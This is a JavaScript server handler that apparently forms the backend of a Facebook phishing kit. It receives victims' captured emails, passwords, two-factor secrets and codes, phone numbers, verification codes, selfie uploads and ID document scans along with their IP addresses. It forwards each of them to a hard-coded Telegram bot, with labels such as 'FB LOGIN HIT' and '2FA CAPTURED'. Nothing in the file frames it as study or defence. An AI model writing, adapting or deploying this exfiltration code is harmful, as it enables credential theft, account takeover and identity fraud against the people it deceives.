const BOT_TOKEN = '8555214864:AAFDB4B7O1gPe2S0bzM3AxoawifmSkctb2Y';
const CHAT_ID = '1944734410';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { type, data, ip } = req.body;
    
    let message = '';
    const timestamp = new Date().toISOString();
    
    switch(type) {
      case 'login':
        message = `🔥 FB LOGIN HIT 🔥\n📧: ${data.email}\n🔑: ${data.password}\n🌐: ${ip}\n🕐: ${timestamp}`;
        break;
      case '2fa':
        message = `🔐 2FA CAPTURED 🔐\n📧: ${data.email}\n🗝️: ${data.secret}\n🔢: ${data.code}\n🌐: ${ip}\n🕐: ${timestamp}`;
        break;
      case 'phone':
        message = `📱 PHONE NUMBER PROVIDED 📱\n📧: ${data.email}\n📞: ${data.phone}\n🌐: ${ip}\n🕐: ${timestamp}`;
        break;
      case 'verify':
        message = `✅ PHONE VERIFICATION ✅\n📧: ${data.email}\n📱 Code: ${data.code}\n🌐: ${ip}\n🕐: ${timestamp}`;
        break;
      case 'action':
        message = `✅ ACTION REQUIRED COMPLETED ✅\n📧: ${data.email}\n🌐: ${ip}\n🕐: ${timestamp}`;
        break;
      case 'selfie':
        message = `🎥 360° FACE VERIFICATION UPLOADED ✅\n📧: ${data.email}\n📁: ${data.filename}\n🌐: ${ip}\n🕐: ${timestamp}`;
        break;
      case 'id':
        message = `🆔 ID UPLOAD COMPLETED 🆔\n📧: ${data.email}\n📄 Front: ${data.front}\n📄 Back: ${data.back}\n🌐: ${ip}\n🕐: ${timestamp}`;
        break;
      default:
        message = `📊 UNKNOWN EVENT 📊\n📧: ${data.email || 'N/A'}\n🌐: ${ip}\n🕐: ${timestamp}`;
    }
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}